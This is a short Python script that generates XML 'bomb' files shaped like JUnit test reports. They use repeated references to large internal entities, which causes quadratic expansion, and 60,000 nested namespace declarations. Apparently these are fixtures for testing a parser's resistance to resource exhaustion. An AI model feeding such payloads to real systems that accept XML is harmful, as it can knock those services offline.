M=1024*1024
def w(n,b): open(f"bombs2/{n}.xml","wb").write(b); print(n,len(b))
# 1 MiB body, attribute variant
ent=b"A"*(512*1024); head=b'<!DOCTYPE t [<!ENTITY e "'+ent+b'">]><testsuite name="s"><testcase name="a" classname="'; tail=b'"/></testsuite>'
w("attr_1mib",head+b"&e;"*((M-len(head)-len(tail))//3)+tail)
# 1 MiB, text variant
head=b'<!DOCTYPE t [<!ENTITY e "'+ent+b'">]><testsuite name="s"><testcase name="a"><failure>'; tail=b'</failure></testcase></testsuite>'
w("text_1mib",head+b"&e;"*((M-len(head)-len(tail))//3)+tail)
# per-case details through a short entity, under the node limit (no identity growth)
ent=b"D"*20000
head=b'<!DOCTYPE t [<!ENTITY e "'+ent+b'">]><testsuite name="s">'; case=b'<testcase name="a"><failure>&e;</failure></testcase>'; tail=b'</testsuite>'
w("per_case_300k",head+case*300000+tail)
# namespaces, 4 MiB body
n=60000
o=b"".join(b'<x xmlns:p%d="u">'%i for i in range(n)); c=b"</x>"*n; sib=b'<y xmlns:p0="u"/>'
head=b'<testsuite name="s"><testcase name="a"/>'+o; tail=c+b'</testsuite>'
w("ns_3mib",head+sib*20000+tail)
